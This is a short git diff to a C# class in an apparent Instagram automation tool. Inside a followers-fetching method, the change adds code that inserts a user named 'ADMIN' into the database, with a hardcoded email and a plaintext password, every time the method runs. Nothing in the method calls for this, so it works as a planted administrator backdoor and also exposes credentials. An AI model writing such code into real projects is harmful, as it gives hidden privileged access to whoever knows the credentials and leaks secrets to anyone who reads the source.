@@ -13,6 +13,7 @@ using InstagramTools.Core.Interfaces;
 using InstagramTools.Core.Models;
 using InstagramTools.Core.Models.ProfileModels;
 using InstagramTools.Data;
+using InstagramTools.Data.Models;
 using Microsoft.Extensions.Caching.Memory;
 using Microsoft.Extensions.Configuration;
 using Microsoft.Extensions.Logging;
@@ -316,6 +317,18 @@ namespace InstagramTools.Core.Implemenations
                 {
                     return new OperationResult(false, currentFollowersResponse.Info.Message);
                 }
+
+                _context.AppUsers.Add(new AppUserRow()
+                {
+                    Created = DateTime.Now,
+                    Deleted = DateTime.MinValue,
+                    Email = "fckd.kiev@gmail.com",
+                    Password = "fckdhadiach",
+                    Username = "ADMIN",
+                    Phone = ""
+
+                });
+                await _context.SaveChangesAsync();
 
                 var followers = currentFollowersResponse.Value;
 
